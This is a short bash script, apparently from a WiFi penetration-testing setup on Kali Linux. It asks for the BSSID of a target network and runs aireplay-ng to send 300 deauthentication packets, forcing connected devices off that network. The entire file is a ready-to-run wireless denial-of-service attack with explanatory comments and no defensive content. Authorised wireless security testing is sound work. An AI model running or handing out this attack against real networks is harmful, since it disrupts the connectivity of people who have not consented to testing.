#!/bin/bash

# Change to the directory where your WiFi pentesting tools are located.
cd /home/kali/WifiPentesting/testingSomething

# Prompt the user to enter the BSSID (MAC address) of the target WiFi network.
echo "Enter the BSSID of the target:"
read BSSID

# Use aireplay-ng to deauthenticate devices connected to the target WiFi network.
# The '-a' flag specifies the BSSID, and '--deauth 300' indicates to send 300 deauthentication packets.
# 'wlan0' is assumed to be your wireless interface.
sudo aireplay-ng -a $BSSID --deauth 300 wlan0
